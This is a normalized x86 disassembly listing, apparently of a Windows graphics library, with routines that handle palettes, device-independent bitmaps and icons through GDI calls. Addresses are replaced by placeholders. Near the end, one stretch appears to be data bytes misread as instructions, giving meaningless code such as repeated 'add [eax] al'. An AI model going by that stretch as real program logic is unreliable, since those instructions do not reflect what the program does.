push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_3a8ae2a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_3a8ae3c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
add ecx ecx
add ecx ecx
call sub_3a63154
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_3a8ac38
mov eax esp
call sub_3a8ada4
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_3a8aee0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_3a8ac38
mov [ esp ] eax
sub_3a8af34
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_3a8a8d4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xe ]
call sub_3a8a8b4
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_3a8b0e1
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
add edx edx
add edx edx
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_3a8a744
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a8b007
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_3a8a754
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b00e
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_3a8a648
sub_3a8b00e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_3a8a8d4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_3a8a744
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a8b0c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_3a8a754
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b0c8
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_3a8b100
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
movzx ecx [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
movzx ebx [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_3a8b190
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_3a62ec8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_3a8b489
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_3a8b279
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_3a8a648
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b280
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_3a8b280
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_3a8b0f4
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_3a62ec8
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_3a8b469
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_3a8af34
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_3a62ec8
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_3a8b446
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
movzx eax [ ebp - 0x46 ]
push eax
movzx eax [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b44d
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_3a62efc
retn
call sub_3a8a69c
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_3a8b0f4
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_3a8b100
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_3a8b4b4
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_3a8a624
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_3a63a44
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_3a8a8d4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
movzx eax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_3a8b598
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_3a8b4b4
movzx eax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_3a8b608
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_3a8b4b4
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a8b6a5
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b6ac
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_3a8b6e0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_3a63a44
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_3a63a44
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_3a8b6d4
xor edx edx
push ebp
push sub_3a8b8d0
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_3a8b598
push 0xffffffff
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_3a8b598
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_3a8b8a9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_3a62ec8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_3a62ec8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_3a62ec8
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_3a62ec8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_3a8b608
mov eax [ ebp - 0x24 ]
push eax
push 0xffffffff
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_3a8b608
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
movzx edx [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
movzx edx [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
movzx edx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b8b0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_3a62efc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_3a62efc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_3a62efc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_3a62efc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_3a8b8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b8d7
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_3a8b8e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a8b930
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_3a8b988
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_3a8b930
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a8b9d1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3a64258
mov edi eax
mov eax esi
call sub_3a64258
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a8bb0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a8baee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_3a69360
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8baf5
mov al 0x1
sub_3a8bb2c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_3a7d0b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8bb74
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8bb7b
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a8bb80
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
movzx ebx [ ebp + 0x14 ]
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_3a8bbb8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_3a7d0b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8bc03
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8bc0a
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a8bc14
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
pop esi
pop ebx
retn
sub_3a8bc50
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
cmp al 0xa7
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
cmpsd [ esi ] [ edi ]
add esi [ eax - 0x5d ]
cmpsd [ esi ] [ edi ]
add ebp eax
mov [ 0x541003a7 ] eax
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
adc [ esi + 0x803 ] ah
add [ ebp - 0x433bffc0 ] cl
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xbc
test al 0x3
adc [ eax ] al
add [ eax ] al
cmp [ ebx - 0x59 ] 0x3
enter 0xa645 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ esi + edi * 4 ]
test al 0x3
mov esp 0x3c03a7a4
cmpsd [ esi ] [ edi ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x403a6 ] dl
add [ eax ] al
xchg esp eax
mov edx r-xdata
mov eax esi
call sub_3a8be68
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_3a8be68
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_3a8be68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8bdcc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_3a652c4
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a8bdc5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_3a64350
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_3a8be68
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_3a646e4
sub_3a8bce8
push ebp
mov ebp esp
